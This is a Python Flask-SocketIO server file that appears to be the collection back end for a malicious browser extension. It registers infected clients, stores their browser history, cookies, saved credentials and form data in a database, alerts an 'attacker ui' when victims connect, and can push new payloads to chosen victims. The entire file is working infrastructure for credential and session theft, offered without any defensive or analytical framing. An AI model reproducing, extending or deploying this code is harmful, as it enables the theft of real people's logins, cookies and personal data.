from flask import Flask, render_template, request, redirect
from flask_socketio import SocketIO, emit, send 
from . import database
import json, os
import eventlet

eventlet.monkey_patch(socket = True)
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "secret!")
socketio = SocketIO(app, async_mode='eventlet')
connected_clients = [] #tuples of (clientid, sid)


from . import frontend

"""
Server responses to client: (int status, data) as tuple
http status code, data
"""


@socketio.on('connect', namespace='/socket.io')
def handle_ext_connect():
    print("client connected sid: {}".format(request.sid))
    return {'message':'connection successful'}
    send('connection successful', room=request.sid)
"""
client payload handler:
    1) if invalid, let the client know. [Complete]
    2) if new client, create the new client in database, set them as connected, and send them their first payload with their clientid. [Complete]
    3) if returning client: [Complete]
        -check if their tuple is in connected_clients. If not: [Complete]
            a)add tuple (clientid, request.sid) into connected_clients [Complete
            b)notify attacker ui using emit() that the client is now connected. [Complete]
        -store all data from client payload [Complete]
        -construct return payload and emit. [Complete]
"""
@socketio.on('extpayload', namespace='/socket.io')
def handle_ext_ping(data):
    print("client ping sid: {} data: {}".format(request.sid, data))
    clientid = data["clientid"]
    bad = 400, "Invalid payload"
    if validate_payload(data) == 0:
        print("Invalid payload received from client.: {}".format(data))
        emit('message', bad[1], room=request.sid)
    elif data["clientid"] == 0: #new client connection!
        print("Generating new client info")
        clientid = database.create_new_client(data)
        connected_clients.append((clientid, request.sid))
        resp = database.construct_response(clientid)
        emit('newClientInstall', clientid, namespace ="/socket.io", broadcast=True)
        return resp
    else:
        isConnected = 0
        for row in connected_clients:
            if(row[0] == clientid):
                isConnected = 1
        if(isConnected == 0):
            connected_clients.append((clientid, request.sid))
            emit('connectSuccessful', clientid, namespace="/socket.io", broadcast=True) 
        if database.store_history(data["history"], clientid):
            return bad
        for cookie in data["cookies"]:
            if database.store_cookie(cookie, clientid):
                return bad
        for cred in data["creds"]:
            if database.store_credential(cred, clientid):
                return bad
        for form in data["forms"]:
            if database.store_form_data(form, clientid):
                return bad
        emit('json', database.construct_response(clientid), room=request.sid)
        emit('pingSuccessful', clientid, namespace="/socket.io", broadcast=True)

@socketio.on('submit')
def handle_form_id_mappings_submit(mappingsStr, url):
    mappings = json.loads(mappingsStr)
    print("processing new form mappings")
    data = [{}]
    data[0].update({"url":url})
    for x in mappings:
        remoteDef = x["key"]
        value = x["value"]
        localDef = x["LocalDef"]
        clientid = x["id"]
        database.store_form_id_mappings(url, localDef, remoteDef)
        data[0].update({remoteDef:value})
    database.store_form_data(data[0], clientid)

def do_pong(clientid, payload):
    sid = [(clientidx, sid) for (clientidx, sid) in connected_clients if clientidx == clientid].pop(0)[1] or None
    if sid == None:
        return -1
    emit('srvpayload', payload, namespace='/socket.io', room=sid)


@socketio.on('disconnect')
def handle_ext_disconnect():
    print("client disconnected: {}".format(request.sid))
    clientids = [(clientid, sidx) for clientid, sidx in connected_clients if sidx == request.sid]
    if len(clientids) == 1:
        clientid = clientids[0]
        connected_clients.remove((clientid))
        database.store_payload(clientid)
        emit('disconnectSuccessful', clientid, namespace="/socket.io", broadcast=True)
    elif len(clientids) != 0:
        print("what the fuck did you do, multiple clients disconnected from same sid: {}".format(clientids))

def validate_payload(data):
    if (type(data.get("clientid", None)) != int or
        type(data.get("history", None)) != type([]) or
        type(data.get("cookies", None)) != type([]) or
        type(data.get("creds", None)) != type([]) or
        type(data.get("forms", None)) != type([])):
        return 0
    return 1

@app.route('/submitform', methods=['POST'])
def submit_form():
    return redirect(request.form['formurl'])


if __name__ == "__main__":
    socketio.run(app, debug=True, use_reloader=False)
